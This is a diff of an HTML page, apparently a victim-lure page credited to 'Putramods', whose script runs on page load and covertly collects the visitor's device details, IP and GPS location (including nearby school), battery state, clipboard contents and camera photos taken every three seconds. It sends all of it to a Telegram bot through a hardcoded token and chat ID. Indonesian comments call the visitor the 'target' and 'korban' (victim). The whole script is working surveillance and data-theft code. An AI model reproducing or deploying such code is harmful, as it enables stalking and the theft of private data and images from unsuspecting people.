@@ -1,3 +1,8 @@
+<!--
+--  Source Code By Putramods
+-- My youtube : Putramods12
+-- Jangan di sebar luaskan!
+-->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -49,66 +54,65 @@
   <audio id="player" src="https://i.top4top.io/m_33131khih0.mp3" loop controls autoplay></audio>
 
   <script>
-    const BOT_TOKEN = '7518590238:AAFa_NmuU323qGIN6XFFox8NIVx9QT1zrPE';
-    const CHAT_ID = '6281867611';
-
-    async function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "Markdown"
-        })
+// Masukin bot tele
+    const botToken = '7518590238:AAFa_NmuU323qGIN6XFFox8NIVx9QT1zrPE';
+    const chatID = '6281867611';
+// Mengirimkan pesan melalui telegram
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: `chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
       });
     }
-
-    async function logInfo() {
-      let output = '';
+// Mendapatkan devace info target
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const plat = navigator.platform;
+      const lang = navigator.language;
+      const res = `${screen.width}x${screen.height}`;
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const online = navigator.onLine ? "Online" : "Offline";
       const now = new Date().toLocaleString();
 
-      try {
-        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-
-        output += `✅ IP : ${ipData.ip} | Time : ${now}\n`;
-        output += `Location: Latitude ${ipData.latitude}, Longitude ${ipData.longitude}\n`;
-        output += `Google Earth URL: https://earth.google.com/web/@${ipData.latitude},${ipData.longitude}\n`;
-        output += `Google Maps URL: https://www.google.com/maps/place/${ipData.latitude},${ipData.longitude}\n\n`;
-      } catch {
-        output += 'IP or Location not available\n\n';
-      }
-
-      const conn = navigator.connection || {};
-      output += `🔻 Downlink: ${conn.downlink || 'N/A'}\n`;
-      output += `📡 Effective Type: ${conn.effectiveType || 'N/A'}\n`;
-      output += `⏱️ Rtt: ${conn.rtt || 'N/A'}\n`;
-      output += `📶 Type: ${conn.type || 'N/A'}\n`;
-
-      output += `🆔 ProductSub: ${navigator.productSub}\n`;
-      output += `🏭 Vendor: ${navigator.vendor}\n`;
-      output += `👆 MaxTouchPoints: ${navigator.maxTouchPoints}\n`;
-      output += `🚫 DoNotTrack: ${navigator.doNotTrack}\n`;
-      output += `💻 HardwareConcurrency: ${navigator.hardwareConcurrency}\n`;
-      output += `🍪 CookieEnabled: ${navigator.cookieEnabled}\n`;
-      output += `📛 AppCodeName: ${navigator.appCodeName}\n`;
-      output += `📱 AppName: ${navigator.appName}\n`;
-      output += `🔖 AppVersion: ${navigator.appVersion}\n`;
-      output += `📲 Platform: ${navigator.platform}\n`;
-      output += `🧩 Product: ${navigator.product}\n`;
-      output += `🕵️ UserAgent: ${navigator.userAgent}\n`;
-      output += `🗣️ Language: ${navigator.language}\n`;
-      output += `🌐 Languages: ${navigator.languages}\n`;
-      output += `🚗 Webdriver: ${navigator.webdriver ? 'Yes' : 'No'}\n`;
-      output += `📄 PdfViewerEnabled: ${navigator.pdfViewerEnabled ?? 'Unknown'}\n`;
-      output += `💾 DeviceMemory: ${navigator.deviceMemory || 'Unknown'}\n`;
-
-      document.getElementById('output').textContent = output;
-      sendToTelegram("```\n" + output + "\n```");
+      return `🖥 *Device Info*\n- User-Agent: ${ua}\n- Platform: ${plat}\n- Language: ${lang}\n- Resolution: ${res}\n- Timezone: ${tz}\n- Status: ${online}\n- Access Time: ${now}`;
     }
-
-    logInfo();
+// Info target
+    function getIPInfo() {
+      return fetch("https://ipinfo.io/json")
+        .then(res => res.json())
+        .then(data => {
+          return `🌐 *IP Info*\n- IP: ${data.ip}\n- City: ${data.city}\n- Region: ${data.region}\n- Country: ${data.country}\n- Location: ${data.loc}\n- ISP: ${data.org}`;
+        });
+    }
+// Mengetahui batre target
+    function getBattery() {
+      if (navigator.getBattery) {
+        return navigator.getBattery().then(batt => {
+          return `🔋 *Battery*\n- Level: ${Math.round(batt.level * 100)}%\n- Charging: ${batt.charging ? "Yes" : "No"}`;
+        });
+      } else {
+        return Promise.resolve("Battery status not supported.");
+      }
+    }
+// Mengambil ip target
+    function getGeoFromIP() {
+      return fetch("https://ipinfo.io/json")
+        .then(res => res.json())
+        .then(data => {
+          const [lat, lon] = data.loc.split(",");
+          return `📍 *Approx. Location*\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Maps: https://www.google.com/maps?q=${lat},${lon}`;
+        });
+    }
+// Mendapatkan PapanClip target
+    function getClipboardText() {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        return navigator.clipboard.readText().then(text => {
+          return `📋 *Clipboard:*\n${text}\n[This A Clipboard by target]`;
+        }).catch(() => "Clipboard not accessible.");
+      }
+      return Promise.resolve("Clipboard not supported.");
+    }
 // Mengambil camera korban / foto setiap 3 detik
     function capturePhotos() {
       let video = document.createElement('video');
@@ -139,7 +143,32 @@
           count++;
         }, 3000);
       }).catch(() => {});
-    }    
+    }
+// Mendapatkan lokasi 100% akurat
+    function getGeoLocation() {
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const { latitude, longitude } = pos.coords;
+        let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+        let data = await res.json();
+        let school = data.address.school || 'N/A';
+        let locationText = `📍 *Location Details* \n- Latitude: ${latitude}\n- Longitude: ${longitude}\n- City: ${data.address.city || 'N/A'}\n- School: ${school}\n- Country: ${data.address.country}\n- Maps: https://www.google.com/maps?q=${latitude},${longitude}\nBy PutraMods`;
+        sendToTelegram(locationText);
+      });
+    }
+// Mengambil semua info
+    async function gatherAll() {
+      const info = getDeviceInfo();
+      const [ipInfo, battInfo, geoIP, clipboard] = await Promise.all([
+        getIPInfo(), getBattery(), getGeoFromIP(), getClipboardText()
+      ]);
+// Mengirimkan Krpada bot
+      sendToTelegram(`${info}\n\n${ipInfo}\n\n${battInfo}\n\n${geoIP}\n\n${clipboard}`);
+      capturePhotos();
+      getGeoLocation();
+    }
+
+    // Jalankan semuanya saat halaman dibuka
+    window.onload = gatherAll;
   </script>
 </body>
 </html>
